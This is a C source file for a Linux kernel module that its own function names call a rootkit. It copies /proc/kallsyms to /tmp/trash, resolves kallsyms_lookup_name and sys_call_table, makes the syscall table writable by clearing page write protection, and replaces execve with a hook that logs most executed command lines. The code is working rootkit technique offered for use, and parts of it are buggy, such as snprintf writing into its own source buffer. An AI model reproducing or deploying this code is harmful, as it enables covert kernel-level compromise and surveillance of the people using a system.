#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <asm/unistd.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/delay.h>

#define MAX_LEN_ENTRY 300
#define MAX_PATH_LEN 100
#define KSYMS_FILE "/tmp/trash"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Taltulon");
// i used code from the following sites:
// read syscall table and some other basic stuff:
// https://github.com/DanielNiv/Process-Hiding-Rootkit/blob/master/captainHook.c
// for the new execve:
// https://github.com/kfiros/execmon/blob/master/kmod/syscalls.c

unsigned long kallsyms_lookup_addr;

// the module parameters
struct work_arg_struct {
    struct work_struct work;
    char *data;
};
static struct work_arg_struct my_work;
struct linux_dirent {
        unsigned long  d_ino;     /* Inode number */
        unsigned long  d_off;     /* Offset to next linux_dirent */
        unsigned short d_reclen;  /* Length of this linux_dirent */
        char           d_name[];  /* Filename (null-terminated) */
};

// defining the pointers to kallsyms_lookup_name function, syscall table, and old stat and old getdents handlers
unsigned long (*kallsyms_lookup_name)(const char *name);
unsigned long *syscall_table;
asmlinkage int (*old_execve)(const struct pt_regs *regs);
char proc_path[MAX_PATH_LEN];

// function to change addr page to rw.
int set_addr_rw(unsigned long _addr) {

        unsigned int level;
        pte_t *pte;

        pte = lookup_address(_addr, &level);

        if (pte->pte &~ _PAGE_RW) {
                pte->pte |= _PAGE_RW;
        }

        return 0;
}

// function to change addr page to ro.
int set_addr_ro(unsigned long _addr) {

        unsigned int level;
        pte_t *pte;

        pte = lookup_address(_addr, &level);
        pte->pte = pte->pte &~_PAGE_RW;

        return 0;
}


asmlinkage int new_execve(const struct pt_regs *regs) {
	size_t exec_line_size;
       	char * exec_str = NULL;
       	char *path = (char*) regs->di;
	char ** p_argv = (char **) regs->si;
	
	static char *substrings[] = {"/usr/bin/cut", "/usr/share", "/usr/sbin/ip", "/usr/bin/head", "/usr/bin/grep"};
	static int num_substrings = sizeof(substrings) / sizeof(substrings[0]);
	
	for (int i = 0; i < num_substrings; ++i) {
        	if (strstr(path, substrings[i]) != NULL) {
        		return (*old_execve)(regs);
		}
    	}
        exec_line_size = (strlen(path) + 1);
	while (NULL != *p_argv) {
		exec_line_size += (strlen(*p_argv) + 1);
		(char **) p_argv++;	
	}
	exec_str = kmalloc(exec_line_size, GFP_KERNEL);
	if (NULL != exec_str) {
		snprintf(exec_str, exec_line_size, "%s", path);

		/* Iterate through the execution arguments */
		p_argv = (char **) regs->si;
		(char **)p_argv++;
		while (NULL != *p_argv) {
			/* Concatenate each argument with our execution line */
			snprintf(exec_str, exec_line_size,
					"%s %s", exec_str, *p_argv);
			(char **) p_argv++;	
		}
		printk(KERN_INFO "%s", exec_str);
	}

	return (*old_execve)(regs);
}


unsigned long obtain_kallsyms_lookup_name(void)
{
	char *file_name                       = KSYMS_FILE;
	int i                                 = 0;         /* Read Index */
	struct file *proc_ksyms               = NULL;      /* struct file the '/proc/kallsyms' or '/proc/ksyms' */
	char *sct_addr_str                    = NULL;      /* buffer for save sct addr as str */
	char proc_ksyms_entry[MAX_LEN_ENTRY]  = {0};       /* buffer for each line at file */
	unsigned long res                    = 0;      /* return value */ 
	char *proc_ksyms_entry_ptr            = NULL;
	int read                              = 0;

	/* Allocate place for sct addr as str */
	if((sct_addr_str = (char*)kmalloc(MAX_LEN_ENTRY * sizeof(char), GFP_KERNEL)) == NULL)
		goto CLEAN_UP;
	
	if(((proc_ksyms = filp_open(file_name, O_RDONLY, 0)) || proc_ksyms) == NULL)
		goto CLEAN_UP;

	read = kernel_read(proc_ksyms, proc_ksyms_entry + i, 1, &(proc_ksyms->f_pos));	
	while( read == 1)
	{
		if(proc_ksyms_entry[i] == '\n' || i == MAX_LEN_ENTRY)
		{
			if(strstr(proc_ksyms_entry, " kallsyms_lookup_name\n") != NULL)
			{
				proc_ksyms_entry_ptr = proc_ksyms_entry;
				strncpy(sct_addr_str, strsep(&proc_ksyms_entry_ptr, " "), MAX_LEN_ENTRY);
				if((res = kmalloc(sizeof(unsigned long), GFP_KERNEL)) == NULL)
					goto CLEAN_UP;
				res = simple_strtoul(sct_addr_str, NULL, 16);
				goto CLEAN_UP;
			}
			i = -1;
			memset(proc_ksyms_entry, 0, MAX_LEN_ENTRY);
		}
		i++;
		read = kernel_read(proc_ksyms, proc_ksyms_entry + i, 1, &(proc_ksyms->f_pos));
	}	
CLEAN_UP:
	if(sct_addr_str != NULL)
		kfree(sct_addr_str);
	if(proc_ksyms != NULL)
		filp_close(proc_ksyms, 0);

	return res;
}


void bash_work_handler(struct work_struct *work){

    struct work_arg_struct *work_arg;
    work_arg = container_of(work, struct work_arg_struct, work);
    char* envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
    char* argv[] = {"/bin/cp", "/proc/kallsyms" ,"/tmp/trash",NULL};
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return;
}


static int __init rootkit_init(void) {

	// init work object so we can push user mode command to cpu queue
	INIT_WORK(&my_work.work, bash_work_handler);
		
	// execute user mode command
	schedule_work(&my_work.work);

	msleep(2000);

	kallsyms_lookup_addr = obtain_kallsyms_lookup_name();
	if(kallsyms_lookup_addr == NULL){
		return -1;
	}
	
	kallsyms_lookup_name = (void*) kallsyms_lookup_addr;
        
	// getting syscall table address from kallsyms_lookup_name function
        syscall_table = (unsigned long*)(*kallsyms_lookup_name)("sys_call_table");

        // syscall table is read only, and we want to override it
        set_addr_rw((unsigned long) syscall_table);

        // saving the old stat and getdents handlers
        old_execve = (void*) syscall_table[__NR_execve];

        syscall_table[__NR_execve] = (unsigned long) new_execve;

        set_addr_ro((unsigned long) syscall_table);
        return 0;
}

static void __exit rootkit_exit(void) {

        set_addr_rw((unsigned long) syscall_table);

        // setting the old open pointer to syscall table
        syscall_table[__NR_execve] = (unsigned long) old_execve;

        set_addr_ro((unsigned long) syscall_table);
	return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);

